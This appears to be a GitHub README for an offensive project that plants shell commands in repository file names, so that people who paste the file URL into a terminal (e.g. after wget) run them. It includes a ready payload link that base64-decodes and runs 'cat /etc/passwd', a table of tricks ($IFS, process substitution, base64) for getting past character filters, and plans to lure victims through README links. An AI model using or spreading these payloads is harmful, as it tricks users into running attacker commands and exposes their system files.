# latrina
bypass url encoding for nontrivial shell commands

* click on the "Go to file" button
* click on the weirdly named file
* look at the address bar
* the url isn't sanitized

Brainlets like LTT will copy the url and eventually execute the payload,  
since they don't know about the "raw" button.  
Bypassing the rookie level will get you to this point.  
Bypassing the god-like level will get you the same,   
but on the raw content page, which is way nastier.  
create a file called ";whoami", now follow the steps above  
when its url is pasted in the terminal  
like ```wget http://localhost/;whoami```, the payload is executed  
can we bypass the entire url encoding set and execute nontrivial commands?

# testing
use this waf and apply the url encoding patches  
https://raw.githubusercontent.com/theMiddleBlue/challenge-bypass-input-validation/main/index.php

# markdown
we can also put the link in the readme  
and hope someone will copy paste it in a terminal  
https://github.com/kusky3/latrina/blob/main/;a=('Y2F0IC9ldGMvcGFzc3dkCg==');b=('base');c=$IFS;d=64;$($b$d$c-d$c-<$c<(echo$c$a))  
but you still need to bypass the "<"

# bypassed
```
'"'   # needed to set string variables, bypassed with "('variable')"
'{'   # needed for "${IFS}", bypassed by concatenating "$" or "-" after them
'}'   # same as above
'|'   # needed for "command1 | command2", bypassed with "command2 < <(command1)"
' '   # needed as arguments separator, bypassed with $IFS
'<<<' # same as the "|" bypass
'>>>' # same as above
'/'   # needed for paths, bypassed by encoding the payload with base64
'&'   # needed to begin the command execution, replaced by ";"
'&&'  # same as above
'>'   # needed for redirection, replaced by "<"
```

# todo
rookie level:
```
'<'
```
should be pretty easy
we just need to find a command like base64  
that can encode text without using pipe "|" or redirect "<>"
e.g. goodbase -d "bG1hbwo="

god-like level:
```
'$'
';'
```
